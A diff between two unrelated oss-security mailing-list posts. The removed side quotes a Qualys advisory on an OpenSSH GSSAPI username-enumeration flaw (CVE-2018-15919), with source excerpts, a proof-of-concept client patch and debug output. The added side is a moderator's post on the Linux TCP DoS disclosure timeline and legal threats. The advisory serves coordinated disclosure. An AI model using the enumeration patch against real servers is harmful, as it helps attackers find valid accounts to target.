@@ -1,188 +1,113 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/28/2
-Message-ID: <20180828075523.i3pyzaxxa7yrhbq5@suse.de>
-Date: Tue, 28 Aug 2018 09:55:23 +0200
-From: Marcus Meissner <meissner@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/09/5
+Message-ID: <20180809125120.GA2475@openwall.com>
+Date: Thu, 9 Aug 2018 14:51:20 +0200
+From: Solar Designer <solar@...nwall.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Another OpenSSH "user enumeration"
+Cc: Matthew Garrett <mjg59@...gle.com>
+Subject: Re: Linux TCP implementation vulnerable to Denial of Service (CVE 2018-5390)
 Content-Type: text/plain; charset=utf-8
 
 Hi,
 
-Mitre has assigned CVE-2018-15919
+A co-moderator had rejected Stiepan's message since it "does not provide
+any additional content to oss-security readers".  I'm also unhappy about
+that, as well as about the focus on legal aspects in Stiepan's postings
+in here in general.  However, the message raises an on-topic question
+(the request for more detail) and brings up an on-topic issue (the
+semi-embargo potentially causing harm).  I feel strongly about us not
+getting into censorship, and I feel that rejecting this message would be
+it.  So I went for the effort of manually restoring the already-rejected
+message into the moderation queue, then approved it.
 
-Ciao, Marcus
+On Thu, Aug 09, 2018 at 07:12:27AM +0000, Stiepan wrote:
+> Could you please provide some more details on the issue?
 
-On Mon, Aug 27, 2018 at 09:27:30AM -0700, Qualys Security Advisory wrote:
-> Hi all,
-> 
-> On August 24, 2018, we sent the following email to openssh@...nssh.com
-> and distros@...openwall.org. About the disclosure of this issue, Solar
-> Designer wrote "I'd be even happier with it being made public right away
-> if that's OK with both the OpenSSH team and Qualys", and Theo de Raadt
-> wrote "More than reporting to us, I urge you to publish it"; for a
-> detailed explanation, please refer to Damien Miller's post:
-> 
-> http://www.openwall.com/lists/oss-security/2018/08/24/1
-> 
-> We thank the OpenSSH developers and the members of
-> distros@...openwall.org for their constructive comments, suggestions,
-> and feedback.
-> 
-> ========================================================================
-> 
-> While properly reviewing the now-famous OpenSSH commit
-> https://github.com/openbsd/src/commit/779974d35b4859c07bc3cb8a12c74b43b0a7d1e0
-> we discovered another username-enumeration vulnerability in auth2-gss.c
-> (enabled by default on at least Fedora, CentOS, and Red Hat Enterprise
-> Linux).
-> 
-> This vulnerability affects OpenSSH versions from 5.9 (September 6, 2011)
-> to the recently released 7.8 (August 24, 2018), inclusive. It is quite
-> similar to CVE-2018-15473 (it is not a timing attack), but it is also
-> markedly different (code excerpts from OpenSSH 7.8p1):
-> 
->  61 static int
->  62 userauth_gssapi(struct ssh *ssh)
->  63 {
-> ...
-> 106         if (!authctxt->valid || authctxt->user == NULL) {
-> 107                 debug2("%s: disabled because of invalid user", __func__);
-> 108                 free(doid);
-> 109                 return (0);
-> 110         }
-> 111 
-> 112         if (GSS_ERROR(PRIVSEP(ssh_gssapi_server_ctx(&ctxt, &goid)))) {
-> 113                 if (ctxt != NULL)
-> 114                         ssh_gssapi_delete_ctx(&ctxt);
-> 115                 free(doid);
-> 116                 authctxt->server_caused_failure = 1;
-> 117                 return (0);
-> 118         }
-> ...
-> 123         if ((r = sshpkt_start(ssh, SSH2_MSG_USERAUTH_GSSAPI_RESPONSE)) != 0 ||
-> 124             (r = sshpkt_put_string(ssh, doid, len)) != 0 ||
-> 125             (r = sshpkt_send(ssh)) != 0)
-> ...
-> 132         authctxt->postponed = 1;
-> 133 
-> 134         return (0);
-> 135 }
-> 
-> - If this first step of the GSSAPI authentication succeeds, then
->   "postponed" is set to 1 (at line 132) and the server sends a packet
->   SSH2_MSG_USERAUTH_GSSAPI_RESPONSE to the attacker (at lines 123-125):
->   in this particular case, the user is necessarily valid (it exists).
-> 
-> - Otherwise "postponed" is not set, and userauth_gssapi() returns 0 at
->   line 117 or 109: in both cases, the server's userauth_finish() sends a
->   packet SSH2_MSG_USERAUTH_FAILURE to the attacker, who should therefore
->   be unable to distinguish between a valid and invalid user. However, if
->   the user is valid, then "server_caused_failure" is set (at line 116);
->   if the user is invalid, it is not set. Consequently, the behavior of
->   userauth_finish() changes:
-> 
-> 340 void
-> 341 userauth_finish(struct ssh *ssh, int authenticated, const char *method,
-> 342     const char *submethod)
-> 343 {
-> ...
-> 410                 if (!partial && !authctxt->server_caused_failure &&
-> 411                     (authctxt->attempt > 1 || strcmp(method, "none") != 0))
-> 412                         authctxt->failures++;
-> 413                 if (authctxt->failures >= options.max_authtries) {
-> ...
-> 417                         auth_maxtries_exceeded(authctxt);
-> 418                 }
-> ...
-> 422                 packet_start(SSH2_MSG_USERAUTH_FAILURE);
-> 423                 packet_put_cstring(methods);
-> 424                 packet_put_char(partial);
-> 425                 packet_send();
-> ...
-> 429 }
-> 
->   . if the user is valid, then "server_caused_failure" is set,
->     "failures" is not incremented, and the attacker can attempt the
->     GSSAPI authentication indefinitely;
-> 
->   . if the user is invalid, then "server_caused_failure" is not set,
->     "failures" is incremented (at line 412), and the server will
->     disconnect the attacker (at line 417) after max_authtries
->     authentication attempts (6, by default).
-> 
-> Below is a very crude proof-of-concept (a patch for the client in
-> OpenSSH 7.8p1):
-> 
-> ------------------------------------------------------------------------
-> 
-> diff -pruN openssh-7.8p1/gss-genr.c openssh-7.8p1-poc/gss-genr.c
-> --- openssh-7.8p1/gss-genr.c	2018-08-22 22:41:42.000000000 -0700
-> +++ openssh-7.8p1-poc/gss-genr.c	2018-08-22 22:41:42.000000000 -0700
-> @@ -286,6 +286,7 @@ ssh_gssapi_check_mechanism(Gssctxt **ctx
->  
->  	ssh_gssapi_build_ctx(ctx);
->  	ssh_gssapi_set_oid(*ctx, oid);
-> +	return 1;
->  	major = ssh_gssapi_import_name(*ctx, host);
->  	if (!GSS_ERROR(major)) {
->  		major = ssh_gssapi_init_ctx(*ctx, 0, GSS_C_NO_BUFFER, &token, 
-> diff -pruN openssh-7.8p1/sshconnect2.c openssh-7.8p1-poc/sshconnect2.c
-> --- openssh-7.8p1/sshconnect2.c	2018-08-22 22:41:42.000000000 -0700
-> +++ openssh-7.8p1-poc/sshconnect2.c	2018-08-22 22:41:42.000000000 -0700
-> @@ -701,6 +701,7 @@ userauth_gssapi(Authctxt *authctxt)
->  	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_TOKEN, &input_gssapi_token);
->  	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERROR, &input_gssapi_error);
->  	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERRTOK, &input_gssapi_errtok);
-> +	return 1;
->  
->  	mech++; /* Move along to next candidate */
->  
-> ------------------------------------------------------------------------
-> 
-> For example, on Fedora, "adm" is a valid user, but "pocorgtfo" is not:
-> 
-> ------------------------------------------------------------------------
-> 
-> ./ssh -v -F /etc/ssh/ssh_config -o PreferredAuthentications=gssapi-with-mic adm@....0.0.1
-> ...
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Next authentication method: gssapi-with-mic
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> ...
-> 
-> ./ssh -v -F /etc/ssh/ssh_config -o PreferredAuthentications=gssapi-with-mic pocorgtfo@....0.0.1
-> ...
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Next authentication method: gssapi-with-mic
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
-> Disconnected from 127.0.0.1 port 22
-> 
-> ------------------------------------------------------------------------
-> 
-> We understand that the OpenSSH developers do not want to treat such a
-> username enumeration (or "oracle") as a vulnerability (although it is
-> quite useful in an attacker's toolbox), but how should we coordinate
-> this disclosure, then? OpenSSH developers, distros, please advise.
-> 
-> Thank you very much! With best regards,
-> 
-> -- 
-> the Qualys Security Advisory team
-> 
+I agree that more detail must have been posted in here, especially given
+that such detail was on linux-distros.
 
--- 
-Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@...e.de>
+The issue is now also public via CERT:
+
+https://www.kb.cert.org/vuls/id/962459
+
+which links to:
+
+https://git.kernel.org/pub/scm/linux/kernel/git/davem/net.git/commit/?id=1a4f14bab1868b443f0dd3c55b689a478f82e72e
+
+which includes the following detail:
+
+---
+Juha-Matti Tilli reported that malicious peers could inject tiny
+packets in out_of_order_queue, forcing very expensive calls
+to tcp_collapse_ofo_queue() and tcp_prune_ofo_queue() for
+every incoming packet.
+
+With tcp_rmem[2] default of 6MB, the ooo queue could
+contain ~7000 nodes.
+
+This patch series makes sure we cut cpu cycles enough to
+render the attack not critical.
+
+We might in the future go further, like disconnecting
+or black-holing proven malicious flows.
+---
+
+The CERT Vulnerability Note also talks about a related issue in FreeBSD.
+
+Partial timeline for this issue as I became aware of it is as follows:
+
+2018/07/23 - the commit referenced above
+2018/07/23 - notification from CERT to some distros
+2018/07/23 - grsecurity tweet linking to the commit
+2018/07/27 - posting to linux-distros
+2018/08/06 - CERT Vulnerability Note published
+2018/08/08 - posting to oss-security
+
+Of course, I am unhappy about this semi-embargo, and even more unhappy
+about the semi-violation of linux-distros list policy on only having
+non-public issues in there.  However, with CERT involved and with
+related issues affecting more than just Linux, there was little I could
+do, short of playing full BOFH and breaking the semi-embargo for
+everyone.  While I think that would have been for the general public's
+benefit overall, I didn't feel about it strongly enough to actually do
+it this time.  I apologize for letting this happen.  (At the same time,
+I did force another semi-public issue to oss-security right away since
+that one didn't involve coordination with so many parties.)
+
+It appears that everyone involved, including the CERT people, Matthew,
+and others commenting on the linux-distros thread, were unhappy about
+the publication delay.  No one I saw said that they wanted the delay.
+Yet somehow CERT didn't pull the trigger sooner.  I guess two weeks
+feels very soon for CERT as it is, even if it is a very long embargo for
+linux-distros.  Also, I guess the discoverer/reporter of the issue had a
+say on it behind the scenes, and other related issues and non-Linux were
+considered in CERT's decision-making.
+
+I am also unhappy about the two-day delay between publication of the
+CERT Vulnerability Note and the mandatory posting to oss-security (it's
+mandatory since the issue was on linux-distros).  I've been pinging
+off-list to make this happen at all, and would have probably made the
+posting myself if it didn't happen for another day.
+
+> About the same period, our secure e-mail provider suffered an unprecedented DDoS with some e-mail messages never reaching us.
+> Since this has business impact,
+
+This is almost certainly unrelated.  (And I dropped the CC's to
+ProtonMail and ITU on this reply, not to spam them with further
+discussion of the unrelated issue.)
+
+> we consider legal action against the opaque Linux-distros vulnerability-disclosure-among-friends-for-fun-and-profit scheme, that we exposed at the ITU earlier this year. This is digital divide in the works, with real impact for non-club-members.
+
+Personally, I strongly oppose legal threats (let alone action) in our
+community.  The way I see it, what we have is primarily a matter of
+different opinions on how to handle security issues best, and most
+people are genuinely acting the way they think works best for everyone
+affected.  With many parties involved in coordinating a disclosure, it
+usually becomes difficult.  There isn't necessarily a right or wrong
+here.  But whoever brings legal action is definitely wrong.
+
+Ironically, Stiepan had also suggested (here on oss-security a while
+ago) that we apply for funding for running the (linux-)distros list (and
+I explained in a reply why we shouldn't).
+
+Alexander
